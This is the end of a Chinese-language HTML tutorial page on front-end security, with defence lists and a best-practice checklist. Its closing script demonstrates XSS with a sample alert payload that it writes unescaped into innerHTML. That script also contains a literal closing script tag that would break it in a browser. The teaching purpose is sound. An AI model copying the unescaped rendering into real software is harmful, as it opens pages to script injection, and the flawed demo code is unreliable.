                <div class="card warning-card">
                    <h3>8.2 客户端副作用攻击</h3>
                    <p>这类攻击利用JavaScript API的副作用，如使用Canvas API进行指纹识别、利用WebGL进行矿场开采等。</p>
                    
                    <h4>防御措施：</h4>
                    <ul>
                        <li>使用Content Security Policy限制资源加载和执行</li>
                        <li>监控和限制异常的资源使用（CPU、内存）</li>
                        <li>向用户明确说明应用的资源使用情况</li>
                        <li>实现资源使用上限和超时机制</li>
                    </ul>
                </div>
                
                <div class="card info-card">
                    <h3>8.3 Web安全新方向</h3>
                    <ul>
                        <li><strong>WebAuthn/FIDO2</strong>：无密码认证标准，使用生物识别或安全密钥</li>
                        <li><strong>Web Crypto API</strong>：客户端加密和密钥管理</li>
                        <li><strong>Privacy-Preserving Analytics</strong>：保护用户隐私的分析方法</li>
                        <li><strong>边缘安全</strong>：在CDN和边缘服务器层实现安全控制</li>
                        <li><strong>零信任架构</strong>：基于"永不信任，始终验证"的安全模型</li>
                    </ul>
                </div>
            </section>
            
            <section id="conclusion">
                <h2>9. 总结与最佳实践清单</h2>
                
                <div class="card success-card">
                    <h3>9.1 前端安全清单</h3>
                    
                    <h4>开发阶段</h4>
                    <ul>
                        <li>✅ 使用ESLint security插件检测代码安全问题</li>
                        <li>✅ 对所有用户输入进行验证和转义</li>
                        <li>✅ 避免使用eval()、Function()等危险函数</li>
                        <li>✅ 使用HTTPS进行所有API通信</li>
                        <li>✅ 正确配置CORS策略</li>
                        <li>✅ 实施CSRF防护机制</li>
                    </ul>
                    
                    <h4>部署阶段</h4>
                    <ul>
                        <li>✅ 设置严格的Content Security Policy</li>
                        <li>✅ 配置X-Frame-Options防止点击劫持</li>
                        <li>✅ 启用HSTS (HTTP Strict Transport Security)</li>
                        <li>✅ 实施适当的CSP和XSS保护头</li>
                        <li>✅ 移除生产环境中的调试信息和注释</li>
                        <li>✅ 配置正确的Cookie安全属性（HttpOnly、Secure、SameSite）</li>
                    </ul>
                    
                    <h4>运维阶段</h4>
                    <ul>
                        <li>✅ 定期更新依赖库修复已知漏洞</li>
                        <li>✅ 集成安全扫描到CI/CD流程</li>
                        <li>✅ 实施入侵检测和异常监控</li>
                        <li>✅ 建立安全事件响应流程</li>
                        <li>✅ 定期进行安全审计和渗透测试</li>
                        <li>✅ 监控第三方库的安全公告</li>
                    </ul>
                </div>
                
                <div class="card">
                    <h3>9.2 安全文化建设</h3>
                    <p>技术措施固然重要，但安全文化的建设同样不可忽视：</p>
                    <ul>
                        <li><strong>持续学习</strong>：关注最新的安全威胁和防护技术</li>
                        <li><strong>安全培训</strong>：对开发团队进行定期安全培训</li>
                        <li><strong>威胁建模</strong>：在项目早期进行安全威胁分析</li>
                        <li><strong>安全评审</strong>：代码审查中包含安全检查</li>
                        <li><strong>用户教育</strong>：提高终端用户的安全意识</li>
                    </ul>
                </div>
            </section>
        </div>
    </div>
    
    <script>
        // 安全演示相关函数
        function simulateXSSAttack() {
            const resultDiv = document.getElementById('xssDemoResult');
            
            // 模拟攻击载荷
            const maliciousInput = '<script>alert("XSS Attack!");</script>';
            
            // 不安全的渲染方式
            const unsafeHtml = `
                <div>
                    <h4>不安全的渲染（模拟）:</h4>
                    <p>用户输入: <code>${maliciousInput}</code></p>
                    <p style="color: red;">在真实场景中，这可能会执行恶意脚本！</p>
                </div>
                <div style="margin-top: 15px;">
                    <h4>安全的渲染:</h4>
                    <p>转义后的内容: ${escapeHtml(maliciousInput)}</p>
                    <p style="color: green;">HTML标签被转义，脚本不会执行</p>
                </div>
            `;
            
            resultDiv.innerHTML = unsafeHtml;
        }
        
        // HTML转义函数
        function escapeHtml(text) {
            const map = {
                '&': '&amp;',
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#039;'
            };
            return text.replace(/[&<>"']/g, m => map[m]);
        }
        
        // 初始化代码高亮（简化实现）
        function highlightCode() {
            const codeBlocks = document.querySelectorAll('pre code');
            codeBlocks.forEach(block => {
                // 实际项目中可使用highlight.js或prism.js
                // 这里仅进行简单的样式应用
                block.style.fontFamily = '"Fira Code", Consolas, Monaco, "Courier New", monospace';
            });
        }
        
        // 页面加载完成后初始化
        document.addEventListener('DOMContentLoaded', () => {
            try {
                highlightCode();
            } catch (error) {
                console.log('代码高亮初始化失败:', error);
            }
        });
    </script>
</body>
</html>